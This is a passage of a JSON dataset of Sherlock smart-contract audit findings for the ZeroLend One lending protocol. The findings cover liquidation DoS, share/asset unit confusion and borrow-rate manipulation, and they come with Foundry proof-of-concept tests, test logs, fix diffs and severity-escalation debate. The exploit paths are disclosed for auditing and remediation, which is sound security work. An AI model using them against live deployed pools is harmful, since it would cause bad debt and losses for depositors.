      "content": "Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/198 \n\n## Found by \nA2-security, Flashloan44, Obsidian, almurhasan, zarkk01\n### Summary\n\nLack of liquidity on collateral asset reserves can cause disruption to liquidation. \n\n### Root Cause\n\nThe protocol don't have option to disable borrowing or withdrawing in a particular asset reserve for a certain extent to protect the collateral deposits. It can only [disable borrowing](https://github.com/sherlock-audit/2024-06-new-scope-bluenights004/blob/main/zerolend-one/contracts/core/pool/configuration/ReserveConfiguration.sol#L166-L167) or [freeze](https://github.com/sherlock-audit/2024-06-new-scope-bluenights004/blob/main/zerolend-one/contracts/core/pool/configuration/ReserveConfiguration.sol#L148-L149) the whole reserves but not for specific portion such as collateral deposits. This can be a big problem because someone can always deduct or empty the reserves either by withdrawing their lended assets or borrowing loan. And when the liquidation comes, the collateral can't be paid to liquidator because the asset reserve is already not enough or emptied.\n\nThe pool administrator might suggest designating whole asset reserve to be used only for collateral deposit purposes and not for lending and borrowing. However this can be circumvented by malicious users by transferring their collateral to other reserves that accepts borrowing and lending which can eventually led the collateral to be borrowed. This is the nature of multi-asset lending protocol, it allows multiple asset reserves for borrowing and lending as per protocol documentation.\n\nThere could be another suggestion to resolve this by only using one asset reserve per pool that offers lending and borrowing but this will already contradict on what the protocol intends to be which is to be a multi-asset lending pool, meaning there are multiple assets offering lending in single pool.\n\nIf the protocol intends to do proper multi-asset lending pool platform, it should protect the collateral assets regarding liquidity issues. \n\n### Internal pre-conditions\n\n1. Pool creator should setup the pool with more than 2 asset reserves offering lending or borrowing and each of reserves accepts collateral deposits. It allows any of the asset reserves to conduct borrowing to any other asset reserves and vice versa. This is pretty much the purpose and design of the multi-asset lending protocol as per documentation.\n\n\n### External pre-conditions\n\n_No response_\n\n### Attack Path\n\nThis can be considered as attack path or can happen also as normal scenario due to the nature or design of the multi-asset lending protocol. Take note the step 6 can be just a normal happening or deliberate attack to disrupt the liquidation.\n\n<img width=\"579\" alt=\"image\" src=\"https://github.com/user-attachments/assets/3a33a2b1-1e9d-4cc5-8463-8b4a4fcc5f46\">\n\n\n\n### Impact\nThis should be high risk since in a typical normal scenario, this vulnerability can happen without so much effort.\nThe protocol also suffers from bad debt as the loan can't be liquidated.\n\n### PoC\n\n1. Modify this test file /zerolend-one/test/forge/core/pool/PoolLiquidationTests.t.sol\nand insert the following:\na. in line 16, put address carl = address(3); // add carl as borrower\nb.  modify this function _generateLiquidationCondition() internal {\n    _mintAndApprove(alice, tokenA, mintAmountA, address(pool)); // alice 1000 tokenA\n    _mintAndApprove(bob, tokenB, mintAmountB, address(pool)); // bob 2000 tokenB\n    _mintAndApprove(carl, tokenB, mintAmountB, address(pool)); // carl 2000 tokenB >>> add this line \n\n\n    vm.startPrank(alice);\n    pool.supplySimple(address(tokenA), alice, supplyAmountA, 0); // 550 tokenA alice supply\n    vm.stopPrank();\n\n    vm.startPrank(bob);\n    pool.supplySimple(address(tokenB), bob, supplyAmountB, 0); // 750 tokenB bob supply\n    vm.stopPrank();\n\n    vm.startPrank(carl);\n    pool.supplySimple(address(tokenB), carl, supplyAmountB, 0); // 750 tokenB carl supply >>> add this portion\n    vm.stopPrank();\n\n    vm.startPrank(alice);\n    pool.borrowSimple(address(tokenB), alice, borrowAmountB, 0); // 100 tokenB alice borrow\n    vm.stopPrank();\n\n    assertEq(tokenB.balanceOf(alice), borrowAmountB);\n\n    oracleA.updateAnswer(5e3);\n  }\n  c. Insert this test\n  function testLiquidationSimple2() external {\n    _generateLiquidationCondition();\n    (, uint256 totalDebtBase,,,,) = pool.getUserAccountData(alice, 0);\n\n    vm.startPrank(carl);\n    pool.borrowSimple(address(tokenA), carl, borrowAmountB, 0); // 100 tokenA carl borrow to deduct the reserves in which the collateral is deposited\n    vm.stopPrank();\n\n    vm.startPrank(bob);\n    vm.expectRevert();\n    pool.liquidateSimple(address(tokenA), address(tokenB), pos, 10 ether); // Bob tries to liquidate Alice but will revert\n\n    vm.stopPrank();\n\n    (, uint256 totalDebtBaseNew,,,,) = pool.getUserAccountData(alice, 0);\n\n    // Ensure that no liquidation happened and Alice's debt remains the same\n    assertEq(totalDebtBase, totalDebtBaseNew, \"Debt should remain the same after failed liquidation\");\n\n  }\n  2. Run the test forge test -vvvv --match-contract PoolLiquidationTest --match-test testLiquidationSimple2\n\n### Mitigation\n\nEach asset reserve should be modified to not allow borrowing or withdrawing for certain collateral deposits. For example, if a particular asset reserve has deposits for collateral, these deposits should not be allowed to be borrowed or withdrew. The rest of the balance of asset reserves will do the lending. At the current design, the pool admin can only make the whole reserve as not enabled for borrowing but not for specific account or amount.\n\n\n\n## Discussion\n\n**sherlock-admin3**\n\n1 comment(s) were left on this issue during the judging contest.\n\n**Honour** commented:\n>  see #147\n\n\n\n**0xspearmint1**\n\nThis issue should be high severity, it satisfies Sherlock's [criteria](https://docs.sherlock.xyz/audits/real-time-judging/judging#iv.-how-to-identify-a-high-issue) for high issues\n\n>Definite loss of funds without (extensive) limitations of external conditions. The loss of the affected party must exceed 1%.\n\nThe attacker can easily delay the liquidation till bad debt accumulates which will be a >1% loss for the lender \n\n\n\n\n**Haxatron**\n\nEscalate\n\nFinal time to use this \n\n**sherlock-admin3**\n\n> Escalate\n> \n> Final time to use this \n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**cvetanovv**\n\nThis issue does not qualify as high severity.\n\nThe vulnerability arises because the protocol allows collateral to be borrowed, which can lead to temporary liquidation failures due to insufficient liquidity in the pool. \n\nHowever, for a user to withdraw all the funds from a pool and cause this scenario, he would need a large amount of capital. Even if they succeed in doing so, the DoS on liquidations is only temporary because the borrower must eventually return the borrowed funds, and they will also incur interest costs.\n\nPlanning to reject the escalation and leave the issue as is.\n\n**0xjuaan**\n\n@cvetanovv \n\n> and they will also incur interest costs\n\nThe interest cost will never need to be paid, because the borrow will not be liquidateable.\n\n> he DoS on liquidations is only temporary because the borrower must eventually return the borrowed funds\n\nThe DoS on liquidations is not temporary because the borrow will never need to be repaid (because there is no risk of liquidation from accrued interest, because all the collateral is borrowed)\nEven if it was temporary, a DoS of liquidations can be weaponised to lead to bad debt, which is >1% profit for the attacker (at the expense of depositors) since their borrowed funds will be worth more than their collateral provided. \n\nBased on the above, it is clearly a high severity issue. It has arised due to forking AAVE but not allowing representative aTokens to be seized, as mentioned in #318:\n> This is a known issue that aave have mitigated by allowing liquidators to seize ATokens instead of underlying tokens, when there is not enough liquidity in the pools.\n> To achieve the modularity expected zerolend have tried to simplify the design by removing this core functionality, this however exposes the protocol to the risk of liquidation being blocked if there is not enough liquidity in the pools.\n\n\n\n\n\n**Honour-d-dev**\n\ni agree with @cvetanovv \nthere will always be costs for the attacker, as all assets ltv must be less than 1 so the attacker will have to deposit more in value than they borrow. Combined with their growing interest that, they'll have to either repay the loan + interest to retrieve their initial capital or don't repay and still suffer losses as borrowing is overcollateralized.\nThis is a temporary DOS at best.\n\n**0xjuaan**\n\nAs I explained, it's a DOS of liquidation which directly leads to bad debt when collateral value keeps dropping, where the attacker's borrowed funds is worth more than their collateral, so they steal funds via this DOS\n\nThey don't need to repay and collect their collateral as the debt is worth more (due to bad debt)\n\n\n**cvetanovv**\n\nI will accept the escalation. In theory, a malicious user with very large capital could DoS the liquidation without any constraints, and does not have to return the collateral.\n\nPlanning to accept the escalation and make this issue High severity.\n\n**WangSecurity**\n\nResult:\nHigh\nHas duplicates\n\n**sherlock-admin4**\n\nEscalations have been resolved successfully!\n\nEscalation status:\n- [haxatron](https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/198/#issuecomment-2394853491): accepted",
      "summary": "\nThe bug report discusses an issue with the lack of liquidity on collateral asset reserves in a multi-asset lending protocol. This can lead to disruption in liquidation and bad debt. The root cause is that the protocol does not have the option to disable borrowing or withdrawing in a specific asset reserve to protect the collateral deposits. This can be exploited by malicious users by deducting or emptying the reserves, preventing liquidators from being paid. The suggested solutions either contradict the purpose of the protocol or can still be circumvented by attackers. The impact of this issue is high, as it can lead to definite loss of funds and bad debt. A proof of concept has been provided and the issue has been escalated to high severity.",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "ZeroLend One",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/198",
      "tags": [],
      "finders": [
        "zarkk01",
        "almurhasan",
        "Obsidian",
        "A2-security",
        "Flashloan44"
      ]
    },
    {
      "id": "41812",
      "title": "H-2: Full Liquidation Won't Sweep the Whole Debts With Leaving Some, And Will Wrongly Set Borrowing as False",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/107 \n\n## Found by \n000000, 0xAlix2, 0xc0ffEE, A2-security, Bigsam, Honour, JCN, KupiaSec, Nihavent, Obsidian, TessKimy, Varun\\_05, almurhasan, coffiasd, dany.armstrong90, dhank, ether\\_sky, iamnmt, silver\\_eth, stuart\\_the\\_minion, trachev, zarkk01\n\n## Summary\n\nWhen a liquidator tries to full liquidation (to cover full debts), there will leave some uncovered debts and the liquidation will wrongly set borrowing status of the debt asset as false.\n\n## Vulnerability Detail\n\nAccording to the [comment](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/interfaces/pool/IPoolSetters.sol#L143-L144) in `IPoolSetters.sol`, `debtToCover` parameter of the `liquidate()` function is intended to be debt assets, not shares.\n\n> The caller (liquidator) covers `debtToCover` amount of debt of the user getting liquidated, and receives a proportionally amount of the `collateralAsset` plus a bonus to cover market risk\n\nBut the `_calculateDebt` function call in the `executeLiquidationCall()` do the operations on debt shares to calculate debt amount to cover and collateral amount to buy.\n\n```solidity\n  function _calculateDebt(\n    DataTypes.ExecuteLiquidationCallParams memory params,\n    uint256 healthFactor,\n    mapping(address => mapping(bytes32 => DataTypes.PositionBalance)) storage balances\n  ) internal view returns (uint256, uint256) {\n    uint256 userDebt = balances[params.debtAsset][params.position].debtShares;\n\n    uint256 closeFactor = healthFactor > CLOSE_FACTOR_HF_THRESHOLD ? DEFAULT_LIQUIDATION_CLOSE_FACTOR : MAX_LIQUIDATION_CLOSE_FACTOR;\n\n    uint256 maxLiquidatableDebt = userDebt.percentMul(closeFactor);\n\n    uint256 actualDebtToLiquidate = params.debtToCover > maxLiquidatableDebt ? maxLiquidatableDebt : params.debtToCover;\n\n    return (userDebt, actualDebtToLiquidate);\n  }\n```\n\nAccording to this function, the return values `userDebt` and `actualDebtToLiquidate` are debt shares because they are not multiplied by borrow index.\n\nMeanwhile, on the collateral reserve side, the `vars.userCollateralBalance` value that is provided as collateral balance to the `_calculateAvailableCollateralToLiquidate()` function, is collateral shares not assets. ([pool/logic/LiquidationLogic.sol#L136-L148](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/LiquidationLogic.sol#L136-L148))\n\n```solidity\n    vars.userCollateralBalance = balances[params.collateralAsset][params.position].supplyShares;\n\n    (vars.actualCollateralToLiquidate, vars.actualDebtToLiquidate, vars.liquidationProtocolFeeAmount) =\n      _calculateAvailableCollateralToLiquidate(\n        collateralReserve,\n        vars.debtReserveCache,\n        vars.actualDebtToLiquidate,\n        vars.userCollateralBalance, // @audit-info Supply shares not assets\n        vars.liquidationBonus,\n        IPool(params.pool).getAssetPrice(params.collateralAsset),\n        IPool(params.pool).getAssetPrice(params.debtAsset),\n        IPool(params.pool).factory().liquidationProtocolFeePercentage()\n      );\n```\n\nAs there is no shares-to-assets conversion in the `_calculateAvailableCollateralToLiquidate()` function, the return values of the function `vars.actualCollateralToLiquidate`, `vars.actualDebtToLiquidate`, `vars.liquidationProtocolFeeAmount` are shares.\n\nThe remaining liquidation flow totally treat these share values as asset amounts. e.g. `_repayDebtTokens()` function calls the `repayDebt` function whose input is supposed to be assets:\n\n```solidity\n  function _repayDebtTokens( ... ) internal {\n    uint256 burnt = balances[params.position].repayDebt(totalSupplies, vars.actualDebtToLiquidate, vars.debtReserveCache.nextBorrowIndex); // <-- @audit `vars.actualDebtToLiquidate` is shares at this moment\n    vars.debtReserveCache.nextDebtShares = burnt;\n  }\n```\n\nThus, when a liquidator tries to cover full debts, the liquidation will leave `((borrowIndex - 1) / borrowIndex) * debtShares` debt shares and will set the borrowing status of the debt asset as false via the following [code snippet](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/LiquidationLogic.sol#L150-L152).\n\n```solidity\n  function executeLiquidationCall(...) external {\n    ... ...\n    if (vars.userDebt == vars.actualDebtToLiquidate) {\n      userConfig.setBorrowing(debtReserve.id, false);\n    }\n    ... ...\n  }\n```\n\n### Proof-Of-Concept\n\nTo make a test case simple, I simplified the oracle price feeds like the below in the `CorePoolTests.sol` file:\n\n```diff\n  function _setUpCorePool() internal {\n    ... ...\n    oracleA = new MockV3Aggregator(8, 1e8);\n-   oracleB = new MockV3Aggregator(18, 2 * 1e8);\n+   oracleB = new MockV3Aggregator(8, 1e8);\n    ... ...\n  }\n```\n\nAnd created a new test file `PoolLiquidationTest2.sol`:\n\n```solidity\n// SPDX-License-Identifier: BUSL-1.1\npragma solidity 0.8.19;\n\nimport \"../../../../lib/forge-std/src/console.sol\";\n\nimport './PoolSetup.sol';\n\nimport {ReserveConfiguration} from './../../../../contracts/core/pool/configuration/ReserveConfiguration.sol';\n\nimport {UserConfiguration} from './../../../../contracts/core/pool/configuration/UserConfiguration.sol';\n\ncontract PoolLiquidationTest2 is PoolSetup {\n  using UserConfiguration for DataTypes.UserConfigurationMap;\n  using ReserveConfiguration for DataTypes.ReserveConfigurationMap;\n  using ReserveConfiguration for DataTypes.ReserveData;\n\n  address alice = address(1);\n  address bob = address(2);\n\n  uint256 mintAmountA = 200 ether;\n  uint256 mintAmountB = 200 ether;\n  uint256 supplyAmountA = 60 ether;\n  uint256 supplyAmountB = 60 ether;\n  uint256 borrowAmountB = 45 ether;\n\n  function setUp() public {\n    _setUpPool();\n    pos = keccak256(abi.encodePacked(alice, 'index', uint256(0)));\n  }\n\n  // @audit-poc\n  function testLiquidationInvalidUnits() external {\n    oracleA.updateAnswer(1e8);\n    oracleB.updateAnswer(1e8);\n\n    _mintAndApprove(alice, tokenA, mintAmountA, address(pool));\n    _mintAndApprove(bob, tokenB, mintAmountB, address(pool));\n\n    vm.startPrank(alice);\n    pool.supplySimple(address(tokenA), alice, supplyAmountA, 0);\n    vm.stopPrank();\n\n    vm.startPrank(bob);\n    pool.supplySimple(address(tokenB), bob, supplyAmountB, 0);\n    vm.stopPrank();\n\n    vm.startPrank(alice);\n    pool.borrowSimple(address(tokenB), alice, borrowAmountB, 0);\n    vm.stopPrank();\n\n    // Advance time to make the position unhealthy\n    vm.warp(block.timestamp + 360 days);\n    oracleA.updateAnswer(1e8);\n    oracleB.updateAnswer(1e8);\n\n    // Print log of borrow rate before liquidation\n    pool.forceUpdateReserve(address(tokenB));\n    DataTypes.ReserveData memory reserveDataB = pool.getReserveData(address(tokenB));\n    console.log(\"reserveDataB.borrowIndex before Liq.\", reserveDataB.borrowIndex);\n\n    DataTypes.PositionBalance memory positionBalance = pool.getBalanceRawByPositionId(address(tokenB), pos);\n    console.log('debtShares Before Liq.', positionBalance.debtShares);\n\n    DataTypes.UserConfigurationMap memory userConfig = pool.getUserConfiguration(alice, 0);\n    console.log('TokenB isBorrowing Before Liq.', UserConfiguration.isBorrowing(userConfig, reserveDataB.id));\n\n    vm.startPrank(bob);\n    vm.expectEmit(true, true, true, false);\n    emit PoolEventsLib.LiquidationCall(address(tokenA), address(tokenB), pos, 0, 0, bob);\n    pool.liquidateSimple(address(tokenA), address(tokenB), pos, 100 ether); // @audit Tries to cover full debts\n    vm.stopPrank();\n\n    positionBalance = pool.getBalanceRawByPositionId(address(tokenB), pos);\n    console.log('debtShares After Liq.', positionBalance.debtShares);\n\n    userConfig = pool.getUserConfiguration(alice, 0);\n    console.log('TokenB isBorrowing After Liq.', UserConfiguration.isBorrowing(userConfig, reserveDataB.id));\n  }\n}\n```\nAnd here are the logs:\n```bash\n$ forge test --match-test testLiquidationInvalidUnits -vvv\n[⠒] Compiling...\n[⠊] Compiling 1 files with Solc 0.8.19\n[⠒] Solc 0.8.19 finished in 4.83s\nCompiler run successful!\n\nRan 1 test for test/forge/core/pool/PoolLiquidationPocTests2.t.sol:PoolLiquidationTest2\n[PASS] testLiquidationInvalidUnits() (gas: 1172963)\nLogs:\n  reserveDataB.borrowIndex before Liq. 1252660064369089319656921640\n  debtShares Before Liq. 45000000000000000000\n  TokenB isBorrowing Before Liq. true\n  debtShares After Liq. 9076447170314674990\n  TokenB isBorrowing After Liq. false\n```\n\nAs can be seen from the logs, there are significant amount of debts left but the borrowing flag was set as false.\n\n## Impact\n\nWrongly setting borrowing status as false will affect the calculation of total debt amount, LTV and health factor, and this incorrect calculation will affect the whole ecosystem of a pool.\n\n## Code Snippet\n\n[pool/logic/LiquidationLogic.sol#L136](https://github.com/sherlock-audit/2024-06-new-scope/blob/c8300e73f4d751796daad3dadbae4d11072b3d79/zerolend-one/contracts/core/pool/logic/LiquidationLogic.sol#L136)\n\n[pool/logic/LiquidationLogic.sol#L264](https://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/LiquidationLogic.sol#L264)\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nUpdate the issued lines in the `LiquidationLogic.sol` file:\n\n```diff\n  function executeLiquidationCall(\n    ... ...\n  ) external {\n    ... ...\n-   vars.userCollateralBalance = balances[params.collateralAsset][params.position].supplyShares;\n+   vars.userCollateralBalance = balances[params.collateralAsset][params.position].getSupplyBalance(collateralReserve.liquidityIndex);\n    ... ...\n  }\n\n  function _calculateDebt(\n    ... ...\n  ) internal view returns (uint256, uint256) {\n-   uint256 userDebt = balances[params.debtAsset][params.position].debtShares;\n+   uint256 userDebt = balances[params.debtAsset][params.position].getDebtBalance(borrowIndex);\n  }\n```\n\nI tried the above POC testcase to the update and the logs are:\n\n```bash\n$ forge test --match-test testLiquidationInvalidUnits -vv\n[⠒] Compiling...\n[⠊] Compiling 7 files with Solc 0.8.19\n[⠒] Solc 0.8.19 finished in 5.90s\nCompiler run successful!\n\nRan 1 test for test/forge/core/pool/PoolLiquidationPocTests2.t.sol:PoolLiquidationTest2\n[PASS] testLiquidationInvalidUnits() (gas: 1137920)\nLogs:\n  reserveDataB.borrowIndex before Liq. 1252660064369089319656921640\n  debtShares Before Liq. 45000000000000000000\n  TokenB isBorrowing Before Liq. true\n  debtShares After Liq. 0\n  TokenB isBorrowing After Liq. false\n```\n\n\n\n## Discussion\n\n**DemoreXTess**\n\nEscalate\n\nThere are two distinct issues that have been grouped into the same issue pool. While the impact is similar, the root causes of the issues are completely different. This categorization is also unfair to the Watsons who reported both issues.\n\n**sherlock-admin3**\n\n> Escalate\n> \n> There are two distinct issues that have been grouped into the same issue pool. While the impact is similar, the root causes of the issues are completely different. This categorization is also unfair to the Watsons who reported both issues.\n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**Tomiwasa0**\n\nAgain i agree with @DemoreXTess , These are two different functions, \nA fix for A doesn't solve B although the seem similar. \nHence 2 different Root cause, similar impact. \nThey should be Duplicated into \n1. Wrong debt amount\n2. Wrong Collateral amount\n\n**samuraii77**\n\n> Escalate\n> \n> There are two distinct issues that have been grouped into the same issue pool. While the impact is similar, the root causes of the issues are completely different. This categorization is also unfair to the Watsons who reported both issues.\n\nNo, it's unfair for watsons who reported both as one if they are split into 2. The issue caused by a single root cause.\n\n**DemoreXTess**\n\n@samuraii77 People who submitted both issues at ones should be the duplicate of both two unique issues. There is nothing wrong about that.\n\n**cvetanovv**\n\nI disagree with the escalation and thought the Lead Judge correctly duplicated them.\n\nThe root cause is that the liquidation will be called with wrong values. And those Watsons who correctly judged the root cause would be harmed by a potential separation. \n\nPlanning to reject the escalation and leave the issue as is.\n\n**DemoreXTess**\n\n@cvetanovv I don't understand. What is your argument for your rejection ? Some of watsons will suffer from that or issues are really same ? \n\nThe root cause are completely different. Solving one of those problems doesn't solve the other issue. They are not even in same block scope. \n\nIf the reason of rejection is the reports who mentioned both issues, we should also consider the watsons who submitted both issues in separate. There are 2 different high issues and it reduces the worth of submissions significantly which is far worse in this situation.\n\n**DemoreXTess**\n\n@cvetanovv If you system doesnt support 1 report 2 duplicate system, we can't do anything for them but it is Watson's responsibility to identify which issue is duplicate of another issue. Those issues are definitely different as I stated above.\n\n**cvetanovv**\n\n@DemoreXTess This is not the main reason. \n\nAs I have written, the root cause is that the liquidation will be called with wrong values. \n\nYou can also see my comment on your other similar escalation https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/473#issuecomment-2426173895\n\nThe same principle is grouped when there are reentrancy vulnerabilities, lack of slippage protection, or unsafe cast. Even if they are different functions and contracts, we duplicate them together.\n\n**DemoreXTess**\n\n@cvetanovv Okay, then my escalations are invalid for both. I didn't know that rule in Sherlock. Thank you for clarification.\n\n**WangSecurity**\n\nResult:\nHigh\nHas duplicates\n\n**sherlock-admin4**\n\nEscalations have been resolved successfully!\n\nEscalation status:\n- [DemoreXTess](https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/107/#issuecomment-2391661677): rejected",
      "summary": "\nThe bug report concerns a problem with the liquidation process in a smart contract. The liquidator is unable to fully cover the debts of the user being liquidated, and the borrowing status of the debt asset is set to false. This is due to a mistake in the code where debt shares are used instead of debt assets. The report also includes a discussion among experts on whether the issue should be escalated or not. The final resolution is to reject the escalation and mark the issue as high priority with duplicates. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "ZeroLend One",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/107",
      "tags": [],
      "finders": [
        "JCN",
        "dany.armstrong90",
        "trachev",
        "0xAlix2",
        "silver\\_eth",
        "iamnmt",
        "zarkk01",
        "KupiaSec",
        "000000",
        "ether\\_sky",
        "Obsidian",
        "A2-security",
        "stuart\\_the\\_minion",
        "Nihavent",
        "dhank",
        "Varun\\_05",
        "Bigsam",
        "TessKimy",
        "0xc0ffEE",
        "almurhasan",
        "Honour",
        "coffiasd"
      ]
    },
    {
      "id": "41811",
      "title": "H-1: A Reserve Borrow Rate can be significantly decreased after liquidation",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/104 \n\n## Found by \n000000, 0xAlix2, 0xc0ffEE, A2-security, BiasedMerc, Honour, JCN, KupiaSec, Nihavent, Obsidian, Tendency, TessKimy, Varun\\_05, almurhasan, dhank, ether\\_sky, jah, lemonmon, perseus, rilwan99, stuart\\_the\\_minion, trachev, wellbyt3, zarkk01\n## Summary\n\nWhen performing a liquidation, the borrow rate of the reserve is updated by burnt debt shares instead of the remaining debt shares.\n\nTherefore, according to the amount of the burnt shares in a liquidation, the borrow rate can be significantly decreased.\n\n## Vulnerability Detail\n\nIn the `LiquidationLogic::executeLiquidationCall()` function, there is a `_repayDebtTokens()` function call to burn covered debt shares through the liquidation.\n\n```solidity\n  function executeLiquidationCall(\n    mapping(address => DataTypes.ReserveData) storage reservesData,\n    mapping(uint256 => address) storage reservesList,\n    mapping(address => mapping(bytes32 => DataTypes.PositionBalance)) storage balances,\n    mapping(address => DataTypes.ReserveSupplies) storage totalSupplies,\n    mapping(bytes32 => DataTypes.UserConfigurationMap) storage usersConfig,\n    DataTypes.ExecuteLiquidationCallParams memory params\n  ) external {\n    ... ...\n    _repayDebtTokens(params, vars, balances[params.debtAsset], totalSupplies[params.debtAsset]);\n    ... ...\n  }\n```\n\nIn the `_repayDebtTokens()` function, `nextDebtShares` of `debtReserveCache` is updated with burnt shares instead of the remaining debt shares.\n\n```solidity\n  function _repayDebtTokens(\n    DataTypes.ExecuteLiquidationCallParams memory params,\n    LiquidationCallLocalVars memory vars,\n    mapping(bytes32 => DataTypes.PositionBalance) storage balances,\n    DataTypes.ReserveSupplies storage totalSupplies\n  ) internal {\n    uint256 burnt = balances[params.position].repayDebt(totalSupplies, vars.actualDebtToLiquidate, vars.debtReserveCache.nextBorrowIndex);\n    vars.debtReserveCache.nextDebtShares = burnt; // <-- Wrong here!!!\n  }\n```\n\nThis incorrectly updated `debtReserveCache.nextDebtShares` then is used to update the borrow rate in interest rate strategy.\n\nConsequently, we can have conclusion that the less amount of debt is covered when running a liquidation, the lower the borrow rate gets because next borrow rate depends on the amount of burnt debt shares.\n\n### Proof-Of-Concept\n\nHere is a proof test case:\n\n```solidity\n// SPDX-License-Identifier: BUSL-1.1\npragma solidity 0.8.19;\n\nimport \"../../../../lib/forge-std/src/console.sol\";\n\nimport './PoolSetup.sol';\n\nimport {ReserveConfiguration} from './../../../../contracts/core/pool/configuration/ReserveConfiguration.sol';\n\nimport {UserConfiguration} from './../../../../contracts/core/pool/configuration/UserConfiguration.sol';\n\ncontract PoolLiquidationTest is PoolSetup {\n  using UserConfiguration for DataTypes.UserConfigurationMap;\n  using ReserveConfiguration for DataTypes.ReserveConfigurationMap;\n  using ReserveConfiguration for DataTypes.ReserveData;\n\n  address alice = address(1);\n  address bob = address(2);\n\n  uint256 mintAmountA = 1000 ether;\n  uint256 mintAmountB = 2000 ether;\n  uint256 supplyAmountA = 550 ether;\n  uint256 supplyAmountB = 750 ether;\n  uint256 borrowAmountB = 400 ether;\n\n  function setUp() public {\n    _setUpPool();\n    pos = keccak256(abi.encodePacked(alice, 'index', uint256(0)));\n  }\n\n  // @audit-poc\n  function testLiquidationDecreaseBorrowRatePoc() external {\n    oracleA.updateAnswer(100e8);\n    oracleB.updateAnswer(100e8);\n\n    _mintAndApprove(alice, tokenA, mintAmountA, address(pool));\n    _mintAndApprove(bob, tokenB, mintAmountB, address(pool));\n\n    vm.startPrank(alice);\n    pool.supplySimple(address(tokenA), alice, supplyAmountA, 0);\n    vm.stopPrank();\n\n    vm.startPrank(bob);\n    pool.supplySimple(address(tokenB), bob, supplyAmountB, 0);\n    vm.stopPrank();\n\n    vm.startPrank(alice);\n    pool.borrowSimple(address(tokenB), alice, borrowAmountB - 1 ether, 0);\n    vm.stopPrank();\n\n    // Advance time to make the position unhealthy\n    vm.warp(block.timestamp + 360 days);\n    oracleA.updateAnswer(100e8);\n    oracleB.updateAnswer(100e8);\n\n    // Expect the position unhealthy\n    vm.startPrank(alice);\n    vm.expectRevert(bytes('HEALTH_FACTOR_LOWER_THAN_LIQUIDATION_THRESHOLD'));\n    pool.borrowSimple(address(tokenB), alice, 1 ether, 0);\n    vm.stopPrank();\n\n    // Print log of borrow rate before liquidation\n    pool.forceUpdateReserve(address(tokenB));\n    DataTypes.ReserveData memory reserveDataB = pool.getReserveData(address(tokenB));\n    console.log(\"reserveDataB.borrowRate before:\", reserveDataB.borrowRate);\n\n    vm.startPrank(bob);\n    vm.expectEmit(true, true, true, false);\n    emit PoolEventsLib.LiquidationCall(address(tokenA), address(tokenB), pos, 0, 0, bob);\n    pool.liquidateSimple(address(tokenA), address(tokenB), pos, 0.01 ether);\n    vm.stopPrank();\n\n    // Print log of borrow rate after liquidation\n    reserveDataB = pool.getReserveData(address(tokenB));\n    console.log(\"reserveDataB.borrowRate after: \", reserveDataB.borrowRate);\n  }\n}\n\n```\n\nAnd logs are:\n```bash\n$ forge test --match-test testLiquidationDecreaseBorrowRatePoc -vvv\n[⠒] Compiling...\n[⠊] Compiling 11 files with Solc 0.8.19\n[⠒] Solc 0.8.19 finished in 5.89s\nCompiler run successful!\n\nRan 1 test for test/forge/core/pool/PoolLiquidationPocTests.t.sol:PoolLiquidationTest\n[PASS] testLiquidationDecreaseBorrowRatePoc() (gas: 1205596)\nLogs:\n  reserveDataB.borrowRate before: 105094339622641509433962264\n  reserveDataB.borrowRate after:  4242953968798528786019\n```\n\n## Impact\n\nA malicious borrower can manipulate the borrow rate of his any unhealthy positions and repay his debt with signficantly low borrow rate.\n\n## Code Snippet\n\n[pool/logic/LiquidationLogic.sol#L246](https://github.com/sherlock-audit/2024-06-new-scope/blob/c8300e73f4d751796daad3dadbae4d11072b3d79/zerolend-one/contracts/core/pool/logic/LiquidationLogic.sol#L246)\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nShould update the `nextDebtShares` with `totalSupplies.debtShares`:\n\n```diff\n  function _repayDebtTokens(\n    DataTypes.ExecuteLiquidationCallParams memory params,\n    LiquidationCallLocalVars memory vars,\n    mapping(bytes32 => DataTypes.PositionBalance) storage balances,\n    DataTypes.ReserveSupplies storage totalSupplies\n  ) internal {\n    uint256 burnt = balances[params.position].repayDebt(totalSupplies, vars.actualDebtToLiquidate, vars.debtReserveCache.nextBorrowIndex);\n-   vars.debtReserveCache.nextDebtShares = burnt;\n+   vars.debtReserveCache.nextDebtShares = totalSupplies.debtShares;\n  }\n\n```",
      "summary": "\nThis bug report discusses an issue where the borrow rate of a reserve can be significantly decreased after a liquidation. The issue was discovered by a group of security experts and is caused by a mistake in the code that updates the borrow rate. This mistake can be exploited by a malicious borrower to manipulate their borrow rate and repay their debt at a lower rate. The code snippet responsible for this issue is identified and a recommendation is given to fix it.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "ZeroLend One",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/104",
      "tags": [],
      "finders": [
        "JCN",
        "perseus",
        "Tendency",
        "trachev",
        "0xAlix2",
        "BiasedMerc",
        "lemonmon",
        "zarkk01",
        "jah",
        "KupiaSec",
